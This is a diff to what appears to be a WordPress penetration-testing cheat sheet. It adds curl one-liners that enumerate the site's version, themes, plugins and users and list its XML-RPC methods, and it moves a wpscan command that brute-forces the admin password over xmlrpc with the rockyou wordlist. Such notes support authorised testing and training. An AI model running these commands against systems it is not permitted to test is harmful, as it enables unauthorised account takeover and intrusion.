@@ -12,18 +12,34 @@ wp-content/plugins
 wp-content/themes
 ```
 
-Interesting commands :
+Enumeration commands (versions, plugins, themes) :
 
 ```bash
-curl -s http://$TARGET | grep WordPress
-curl -s http://$TARGET/ | grep plugins
-curl -s http://$TARGET/?p=1 | grep plugins
+curl -s -X GET http://$TARGET | grep '<meta name="generator"'
+curl -s -X GET http://$TARGET | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
+curl -s -X GET http://$TARGET | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
+
 wpscan --url http://$TARGET --enumerate --api-token <API_TOKEN>
-# Bruteforce
-wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://$TARGET
+```
+
+Retrieve users :
+```bash
+curl http://$TARGET/wp-json/wp/v2/users | jq
+curl -s -I http://$TARGET/?author=1 #then 2 3 ... 
+```
+
+Get all accepted XML-RPC methods :
+```bash
+curl -s -X POST http://$TARGET/xmlrpc.php -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" -v
 ```
 
 ### Exploitation
+
+Bruteforcing user's password
+
+```bash
+wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://$TARGET
+```
 
 - Check for vulnerable plugins
 
